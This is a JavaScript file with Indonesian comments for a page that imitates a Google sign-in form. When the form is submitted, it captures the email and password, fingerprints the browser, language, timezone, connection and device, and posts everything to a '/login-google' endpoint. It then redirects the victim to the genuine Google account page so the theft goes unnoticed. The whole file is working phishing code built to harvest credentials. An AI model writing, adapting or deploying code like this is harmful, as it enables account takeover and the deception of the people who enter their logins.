// Checkbox Password
const checkbox = document.getElementById('checkbox');
const passwordInput = document.getElementById('password');

checkbox.addEventListener('change', function () {
  passwordInput.type = this.checked ? 'text' : 'password';
});
  
// Validasi Form
const form = document.getElementById('googleForm');
const email = document.getElementById('email');
const password = document.getElementById('password');
const login = document.getElementById('google');
  
// Regex
const vem = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// Valid Input
function validInput() {
  const inem = email.value.trim();
  const inpas = password.value.trim();
  const vpas = inpas.length >= 6 && inpas.length <= 30;
  
  const emusph = vem.test(inem);
    
  return emusph && vpas;
}

// format timestamp: "YYYY/MM/DD HH.mm"
function formatTimestamp(d = new Date()) {
  const z = n => String(n).padStart(2, '0');
  const YYYY = d.getFullYear();
  const MM = z(d.getMonth() + 1);
  const DD = z(d.getDate());
  const hh = z(d.getHours());
  const mm = z(d.getMinutes());
  return `${YYYY}/${MM}/${DD} ${hh}.${mm}`;
}

// Fungsi untuk mendapatkan browser info (fallback)
function getBrowserInfo() {
  const ua = navigator.userAgent;
  let browserName = 'Unknown';
  let browserVersion = 'Unknown';
  
  if (ua.includes('Chrome') && !ua.includes('Edg')) {
    browserName = 'Chrome';
    const match = ua.match(/Chrome\/([0-9.]+)/);
    browserVersion = match ? match[1] : 'Unknown';
  } else if (ua.includes('Firefox')) {
    browserName = 'Firefox';
    const match = ua.match(/Firefox\/([0-9.]+)/);
    browserVersion = match ? match[1] : 'Unknown';
  } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
    browserName = 'Safari';
    const match = ua.match(/Version\/([0-9.]+)/);
    browserVersion = match ? match[1] : 'Unknown';
  } else if (ua.includes('Edg')) {
    browserName = 'Edge';
    const match = ua.match(/Edg\/([0-9.]+)/);
    browserVersion = match ? match[1] : 'Unknown';
  }
  
  return { browserName, browserVersion };
}

// Fungsi untuk mendapatkan language info
function getLanguageInfo() {
  return {
    language: navigator.language || 'Unknown',
    languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown'
  };
}

// Fungsi untuk mendapatkan timezone info
function getTimezoneInfo() {
  return {
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
    timezoneOffset: new Date().getTimezoneOffset()
  };
}

// Fungsi untuk mendapatkan connection info
function getConnectionInfo() {
  if (navigator.connection) {
    const connection = navigator.connection;
    return {
      connectionType: connection.effectiveType || 'Unknown',
      connectionSpeed: connection.downlink || 'Unknown'
    };
  }
  
  return {
    connectionType: 'Unknown',
    connectionSpeed: 'Unknown'
  };
}
  
// Submit
form.addEventListener('submit', function(e) {
  e.preventDefault();
  if (!validInput()) {
    return;
  }
  
  const emailG = email.value.trim() || 'Unknown';
  const passG = password.value.trim() || 'Unknown';
  const logG = login.value.trim() || 'Unknown';
  const date = formatTimestamp(new Date()) || "Unknown";
  
  // Dapatkan data tambahan yang tidak butuh High Entropy
  const browserInfo = getBrowserInfo();
  const languageInfo = getLanguageInfo();
  const timezoneInfo = getTimezoneInfo();
  const connectionInfo = getConnectionInfo();
  
  // Ambil nilai dari objek yang dikembalikan fungsi
  const browser = `${browserInfo.browserName} ${browserInfo.browserVersion}` || "Unknown";
  const lang = languageInfo.language || "Unknown";
  const timez = timezoneInfo.timezone || "Unknown";
  const connection = `${connectionInfo.connectionType} ${connectionInfo.connectionSpeed}Mbps` || "Unknown";
  
  const sendData = (extra = {}) => {
    const payload = {
      emailG,
      passG,
      logG,
      date,
      browser,
      lang,
      timez,
      connection,
      ...extra
    };
    
    fetch('/login-google', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    })
    .then(res => {
      if (!res.ok) throw new Error('Gagal kirim data');
      
      // Jika berhasil kirim data
      email.value = '';
      password.value = '';
      window.location.href = 'https://myaccount.google.com/';
    })
    .catch(err => {
      console.error('Error:', err);
    });
  };
  
  // Cek User Agent
  if(navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
    navigator.userAgentData.getHighEntropyValues([
      'architecture',
      'model', 
      'platform', 
      'platformVersion', 
      'uaFullVersion',
      'bitness',
      'brands'
    ])
    .then(info => {
      sendData({
        model: info.model || 'Unknown',
        platform: info.platform || 'Unknown',
        versi: info.platformVersion || 'Unknown'
      });
    })
    .catch(err => {
      console.warn('Cannot get high entropy values:', err);
      sendData();
    });
  } else {
    sendData();
  }
});